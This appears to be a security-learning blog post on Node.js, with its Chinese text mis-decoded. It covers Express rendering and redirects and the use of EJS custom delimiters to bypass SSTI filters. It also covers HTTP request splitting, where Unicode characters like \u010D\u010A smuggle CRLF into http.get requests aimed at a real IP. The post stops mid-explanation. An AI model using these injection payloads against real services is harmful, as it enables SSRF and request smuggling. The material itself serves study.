<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>nodejs(æ‹†åˆ†æ”»å‡») | Ttoc's blog</title><meta name="author" content="Ttoc"><meta name="copyright" content="Ttoc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ€»ç»“å­¦ä¹ ä¸€ä¸‹ï¼Œé‡ç‚¹æŠŠæ‹†åˆ†æ”»å‡»å­¦ä¹ è®°å¿†ä¸€ä¸‹ï¼ŒåŸå‹é“¾æ±¡æŸ“å•ç‹¬å¼€ä¸€ç¯‡å†™">
<meta property="og:type" content="article">
<meta property="og:title" content="nodejs(æ‹†åˆ†æ”»å‡»)">
<meta property="og:url" content="https://ttoc.fun/2023/04/06/nodejs(%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB)/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="æ€»ç»“å­¦ä¹ ä¸€ä¸‹ï¼Œé‡ç‚¹æŠŠæ‹†åˆ†æ”»å‡»å­¦ä¹ è®°å¿†ä¸€ä¸‹ï¼ŒåŸå‹é“¾æ±¡æŸ“å•ç‹¬å¼€ä¸€ç¯‡å†™">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ttoc.fun/img/18.jpg">
<meta property="article:published_time" content="2023-04-06T14:47:24.933Z">
<meta property="article:modified_time" content="2023-08-25T02:15:04.299Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="js">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.fun/img/18.jpg"><link rel="shortcut icon" href="/img/website.png"><link rel="canonical" href="https://ttoc.fun/2023/04/06/nodejs(%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç®€"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":20,"languages":{"author":"Author: Ttoc","link":"Link: ","source":"Source: Ttoc's blog","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'nodejs(æ‹†åˆ†æ”»å‡»)',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2023-08-25 10:15:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/progress_bar.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#494444;--content-bg-color:#524d4d;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#423f3f;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#3b3d3f;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#4d5155;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-vs.css" type="text/css"></head><body><link rel="stylesheet" href="/css/barber-shop.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background:url(/img/18.jpg);background-attachment: local;background-position: center;background-size: cover;background-repeat: no-repeat;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/18.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ttoc's blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">nodejs(æ‹†åˆ†æ”»å‡»)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-06T14:47:24.933Z" title="Created 2023-04-06 22:47:24">2023-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-08-25T02:15:04.299Z" title="Updated 2023-08-25 10:15:04">2023-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">ç½‘ç»œå®‰å…¨å­¦ä¹ </a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>11min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>æ€»ç»“å­¦ä¹ ä¸€ä¸‹ï¼Œé‡ç‚¹æŠŠæ‹†åˆ†æ”»å‡»å­¦ä¹ è®°å¿†ä¸€ä¸‹ï¼ŒåŸå‹é“¾æ±¡æŸ“å•ç‹¬å¼€ä¸€ç¯‡å†™</code></p>
<span id="more"></span>

<h2 id="res-render"><a href="#res-render" class="headerlink" title="res.render()"></a>res.render()</h2><p><code>res.render()</code>æ˜¯ Node.js ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒå¯ä»¥<code>æ¸²æŸ“è§†å›¾å¹¶å°†æ¸²æŸ“åçš„ HTML å­—ç¬¦ä¸²å‘é€ç»™å®¢æˆ·ç«¯</code>ã€‚å®ƒå¯ç”¨äºé€šè¿‡ä»æœåŠ¡å™¨ä¼ é€’çš„æ•°æ®å‘ˆç°åŠ¨æ€å†…å®¹ã€‚</p>
<p>ä»¥ä¸‹æ˜¯åœ¨ Node.js ä¸­ä½¿ç”¨ <code>res.render()</code> çš„ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = &#123; <span class="attr">message</span>: <span class="string">&#x27;ä½ å¥½ï¼Œä¸–ç•Œï¼&#x27;</span> &#125;;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®æ ¹ URL æ—¶ï¼ŒæœåŠ¡å™¨å°†é€šè¿‡ä½¿ç”¨åŒ…å«æ¶ˆæ¯ <code> ä½ å¥½ï¼Œä¸–ç•Œï¼</code>çš„ <code>data</code> å¯¹è±¡æ¥å‘ˆç° <code>index</code> è§†å›¾ï¼Œå¹¶å‘å®¢æˆ·ç«¯å‘é€å“åº”ã€‚</p>
<p><code>index</code> è§†å›¾é€šå¸¸æ˜¯ä½¿ç”¨æ¨¡æ¿è¯­è¨€ç¼–å†™çš„æ¨¡æ¿æ–‡ä»¶ï¼Œä¾‹å¦‚ EJSã€Handlebars æˆ– Pugã€‚</p>
<h2 id="é‡å®šå‘æ¦‚å¿µ"><a href="#é‡å®šå‘æ¦‚å¿µ" class="headerlink" title="é‡å®šå‘æ¦‚å¿µ"></a>é‡å®šå‘æ¦‚å¿µ</h2><p>Expressæ˜¯ä¸€ä¸ªåŸºäº<code>Node.js</code>å®ç°çš„Webæ¡†æ¶ï¼Œ</p>
<p>å…¶å“åº”HTTPè¯·æ±‚çš„responseå¯¹è±¡ä¸­æœ‰ä¸¤ä¸ªç”¨äºURLè·³è½¬æ–¹æ³•</p>
<p><code>res.location()</code>å’Œ<code>res.redirect()</code></p>
<h3 id="res-location"><a href="#res-location" class="headerlink" title="res.location()"></a>res.location()</h3><p>res.location()é‡Œé¢çš„å‚æ•°æœ‰ä¸‰ç§ï¼Œä¸€ç§æ˜¯å½“å‰åŸŸåè·¯å¾„ï¼ˆä¾‹å¦‚â€&#x2F;api&#x2F;postâ€ï¼‰ï¼Œä¸€ç§æ˜¯ç»å¯¹è·¯å¾„(â€œ<a target="_blank" rel="noopener" href="https://www.oecom.cn/api/post">https://www.oecom.cn/api/post</a> â€œ)ï¼Œå¦ä¸€ç§å°±æ˜¯ç›´æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šback</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;https://www.oecom.cn/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;back&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="res-redirect"><a href="#res-redirect" class="headerlink" title="res.redirect"></a>res.redirect</h3><p><code>redirect()</code>å¯ä»¥æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œ</p>
<p>å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°å€¼ç±»å‹ï¼Œåˆ™ä»£è¡¨é‡å®šå‘æ–¹å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå°±æ˜¯éœ€è¦è·³è½¬åˆ°çš„è·¯å¾„ã€‚</p>
<p>å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™ç›´æ¥ä»£è¡¨è·³è½¬çš„è·¯å¾„<br>é‡å®šå‘æ–¹å¼æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯<code>301</code>é‡å®šå‘ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰ï¼Œå¦ä¸€ç§æ˜¯<code>302</code>é‡å®šå‘ï¼ˆä¸´æ—¶é‡å®šå‘ï¼‰ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸å¡«ï¼Œåˆ™<code>é»˜è®¤ä¸º302</code>é‡å®šå‘ã€‚è‡³äºç¬¬äºŒä¸ªå‚æ•°è·¯å¾„ï¼Œåˆ™å’Œ<code>location</code>ä¸€è‡´ã€‚<br>åœ¨<code>redirect</code>ä¸­æœ‰ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå³ï¼š<code>res.redirect(&quot;api/post&quot;)</code>ï¼Œå‡è®¾åœ¨ç¨‹åºåœ¨<code>/get</code>è·¯ç”±ä¸‹ï¼Œåˆ™è¡¨ç¤ºè¦è·³è½¬çš„è·¯å¾„ä¸º<code>/get/api/post</code>ã€‚</p>
<p>ä¸ªäººä¸æ¨èè¿™ç§æ–¹å¼ï¼Œå› ä¸ºåœ¨åç»­çš„ä»£ç é˜…è¯»æ—¶ä¸åˆ©äºå¿«é€Ÿç†è§£é‡å®šå‘ä½ç½®ã€‚</p>
<h2 id="delimiter"><a href="#delimiter" class="headerlink" title="delimiter"></a>delimiter</h2><p>è¿™æ˜¯å¯¹æ ‡ç­¾çš„åˆ†éš”ç¬¦å®šä¹‰çš„é€‰é¡¹ï¼Œæœ‰æ—¶å€™å½“å¯¹sstiä¸€äº›æ ‡ç­¾è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¦‚æœå­˜åœ¨å°†å‚æ•°è¿›è¡Œæ¸²æŸ“ï¼Œä¸”å‚æ•°æ˜¯å¯æ§ï¼Œå¯ä»¥å°è¯•<code>delimiter</code>æ·»åŠ è¿›å»ï¼Œè®©å…¶åœ¨æ¸²æŸ“çš„æ—¶å€™å¯ä»¥è¦†ç›–ä¿®æ”¹<code>delimiter</code>å†…å®¹ï¼Œä½¿å¾—å¯ä»¥ç”¨å…¶ä»–åˆ†éš”ç¬¦ç»•è¿‡</p>
<h3 id="Custom-delimiters"><a href="#Custom-delimiters" class="headerlink" title="Custom delimiters"></a>Custom delimiters</h3><p>è‡ªå®šä¹‰åˆ†éš”ç¬¦å¯ä»¥åŸºäºæ¯ä¸ªæ¨¡æ¿åº”ç”¨ï¼Œä¹Ÿå¯ä»¥å…¨å±€åº”ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>),</span><br><span class="line">    users = [<span class="string">&#x27;geddy&#x27;</span>, <span class="string">&#x27;neil&#x27;</span>, <span class="string">&#x27;alex&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Just one template</span></span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;, &#123;<span class="attr">delimiter</span>: <span class="string">&#x27;?&#x27;</span>, <span class="attr">openDelimiter</span>: <span class="string">&#x27;[&#x27;</span>, <span class="attr">closeDelimiter</span>: <span class="string">&#x27;]&#x27;</span>&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Or globally</span></span><br><span class="line">ejs.<span class="property">delimiter</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">ejs.<span class="property">openDelimiter</span> = <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">ejs.<span class="property">closeDelimiter</span> = <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="NodeJS-ä¸­çš„-CRLF-x2F-SSRF-Injection"><a href="#NodeJS-ä¸­çš„-CRLF-x2F-SSRF-Injection" class="headerlink" title="NodeJS ä¸­çš„ CRLF&#x2F;SSRF Injection"></a>NodeJS ä¸­çš„ CRLF&#x2F;SSRF Injection</h2><blockquote>
<p>æœ¬æ–‡ç”±<strong>WHOAMI</strong>åŸåˆ›å‘å¸ƒ</p>
<p>è½¬è½½ï¼Œè¯·å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.anquanke.com/note/repost">è½¬è½½å£°æ˜</a>ï¼Œæ³¨æ˜å‡ºå¤„ï¼š <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p>
<p>å®‰å…¨å®¢ - æœ‰æ€æƒ³çš„å®‰å…¨æ–°åª’ä½“</p>
</blockquote>
<p>2018 å¹´æœ‰ç ”ç©¶è€…å‘ç°ï¼Œå½“Node.jsä½¿ç”¨ <code>http.get</code> å‘ç‰¹å®šè·¯å¾„å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œå‘å‡ºçš„è¯·æ±‚å®é™…ä¸Šè¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„ï¼</p>
<p><img src="https://p5.ssl.qhimg.com/t01e1beeee10e196ba2.png" alt="img"></p>
<p>æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯ç”±Node.jså°†HTTPè¯·æ±‚å†™å…¥è·¯å¾„æ—¶ï¼Œå¯¹Unicodeå­—ç¬¦çš„æœ‰æŸç¼–ç å¼•èµ·çš„ã€‚</p>
<blockquote>
<p>Â·æ³¨ï¼šnodejs&lt;&#x3D;8 çš„æƒ…å†µä¸‹å­˜åœ¨ Unicode å­—ç¬¦æŸåå¯¼è‡´çš„ HTTP æ‹†åˆ†æ”»å‡»ï¼Œnodejs ä¸ä¼šå¯¹è¿™äº› Unicode è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯ HTTP æ§åˆ¶å­—ç¬¦</p>
</blockquote>
<h3 id="HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå"><a href="#HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå" class="headerlink" title="HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå"></a>HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå</h3><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„ HTTP è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç å­—ç¬¦é›†ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶è¿™ä¸ªè¡¨æƒ…ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„è¯·æ±‚è·¯å¾„ä¸­å«æœ‰å¤šå­—èŠ‚ç¼–ç çš„Unicodeå­—ç¬¦æ—¶ï¼Œä¼šè¢«æˆªæ–­å–æœ€ä½å­—èŠ‚ï¼Œæ¯”å¦‚ <code>\u0130</code> å°±ä¼šè¢«æˆªæ–­ä¸º <code>\u30</code>ï¼š</p>
<p><img src="https://p3.ssl.qhimg.com/t01005ff8722a4037e0.png" alt="img"></p>
<h3 id="Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»"><a href="#Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»" class="headerlink" title="Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»"></a>Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»</h3><p>åˆšæ‰æ¼”ç¤ºçš„é‚£ä¸ª HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸåçœ‹ä¼¼æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†å®ƒå¯ä»¥åœ¨ nodejs çš„ HTTP æ‹†åˆ†æ”»å‡»ä¸­å¤§æ˜¾èº«æ‰‹ã€‚</p>
<p>ç”±äºnodejsçš„HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œå³å¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªURLè·¯å¾„ä¸­å«æœ‰å›è½¦ã€æ¢è¡Œæˆ–ç©ºæ ¼ç­‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚æ˜¯ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼Œæ‰€ä»¥æ­£å¸¸çš„CRLFæ³¨å…¥åœ¨nodejsä¸­å¹¶ä¸èƒ½åˆ©ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0A/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01911a74dee31030c4.png" alt="img"></p>
<p>ä½†ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†Unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›ä¿æŠ¤æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›é«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//47.101.57.72:4000/ÄÄŠ/WHOAMI</span></span><br></pre></td></tr></table></figure>

<p>å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡º <code>GET</code> è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š</p>
